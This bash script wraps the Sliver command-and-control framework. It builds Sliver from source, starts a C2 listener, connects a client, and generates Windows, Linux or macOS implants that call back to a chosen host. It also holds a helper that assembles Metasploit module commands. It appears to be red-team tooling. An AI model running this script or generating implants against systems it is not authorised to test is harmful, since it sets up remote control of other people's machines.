#!/usr/bin/env bash
# ==============================================================================
# SLIVER C2 — Modern cross-platform C2 framework
# Usage: bash sliver.sh [install|server|client|implant|menu]
# ==============================================================================
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../../../lib/common.sh" 2>/dev/null || true
source "$SCRIPT_DIR/../../../lib/env.sh" 2>/dev/null || true
SLIVER_DIR="${SLIVER_DIR:-$HOME/sliver}"
SLIVER_BIN_CLIENT="${SLIVER_BIN_CLIENT:-$HOME/sliver-client}"
SLIVER_BIN_SERVER="${SLIVER_BIN_SERVER:-$HOME/sliver-server}"
IN_MSF=false; [[ "${MSF_CONSOLE:-}" == "1" ]] || [[ -n "${MSFCONSOLE_BIN:-}" ]] && IN_MSF=true
run_msf() { local m="$1"; shift; local c="use $m"; for a in "$@"; do c="$c; set $a"; done; c="$c; run"; echo "$c"; }

install_sliver() {
    step "Installing Sliver C2"
    [[ -f "$SLIVER_BIN_CLIENT" && -f "$SLIVER_BIN_SERVER" ]] && { log "Sliver already installed"; return 0; }
    if ! cmd_exists go; then warn "Go not installed. Run setup.sh --deps first"; return 1; fi
    info "Building Sliver from source..."
    cd /tmp; git clone https://github.com/BishopFox/sliver.git 2>/dev/null || true
    cd sliver; make 2>&1 | tail -20
    cp sliver-server sliver-client "$HOME/"
    log "Sliver installed to ~/sliver-server and ~/sliver-client"
}

start_server() {
    local lhost="${1:-0.0.0.0}"; local lport="${2:-31337}"
    [[ -f "$SLIVER_BIN_SERVER" ]] || { err "Sliver not installed. Run: bash sliver.sh install"; return 1; }
    info "Starting Sliver server on $lhost:$lport"
    "$SLIVER_BIN_SERVER" --laddr "$lhost" --lport "$lport" &
    echo $! > /tmp/sliver-server.pid
    log "Sliver server started (PID: $!)"
    info "Connect client: sliver-client --host $lhost --port $lport"
}

start_client() {
    local host="${1:-localhost}"; local port="${2:-31337}"
    [[ -f "$SLIVER_BIN_CLIENT" ]] || { err "Sliver client not found"; return 1; }
    info "Connecting to Sliver server at $host:$port"
    "$SLIVER_BIN_CLIENT" --host "$host" --port "$port"
}

generate_implant() {
    local lhost="${1:-}"; local lport="${2:-31337}"; local fmt="${3:-exe}"
    [[ -z "$lhost" ]] && { read -r -p "LHOST: " lhost; [[ -z "$lhost" ]] && { err "LHOST required"; return 1; }; }
    [[ -f "$SLIVER_BIN_CLIENT" ]] || { err "Sliver not installed"; return 1; }
    info "Generating $fmt implant for $lhost:$lport"
    "$SLIVER_BIN_CLIENT" generate --format "$fmt" --host "$lhost" --port "$lport" --save "/tmp/sliver-implant.$fmt"
    log "Implant saved: /tmp/sliver-implant.$fmt"
}

case "${1:-menu}" in
    install) install_sliver ;;
    server) start_server "${2:-0.0.0.0}" "${3:-31337}" ;;
    client) start_client "${2:-localhost}" "${3:-31337}" ;;
    implant) generate_implant "${2:-}" "${3:-31337}" "${4:-exe}" ;;
    menu)
        echo ""; echo -e "${BOLD}Sliver C2 Options:${NC}"
        echo -e "  ${GREEN}1)${NC} Install Sliver"
        echo -e "  ${GREEN}2)${NC} Start Server"
        echo -e "  ${GREEN}3)${NC} Start Client"
        echo -e "  ${GREEN}4)${NC} Generate Implant"
        echo -e "  ${GREEN}0)${NC} Back"
        read -r -p "  [?] Choice: " c
        case "$c" in
            1) install_sliver ;;
            2) read -r -p "LHOST [0.0.0.0]: " lh; read -r -p "LPORT [31337]: " lp; start_server "${lh:-0.0.0.0}" "${lp:-31337}" ;;
            3) read -r -p "Host [localhost]: " h; read -r -p "Port [31337]: " p; start_client "${h:-localhost}" "${p:-31337}" ;;
            4) read -r -p "LHOST: " lh; read -r -p "LPORT [31337]: " lp; read -r -p "Format (exe/elf/macho) [exe]: " fm; generate_implant "$lh" "${lp:-31337}" "${fm:-exe}" ;;
        esac
        ;;
    *) err "Usage: bash sliver.sh [install|server|client|implant|menu]"; exit 1 ;;
esac
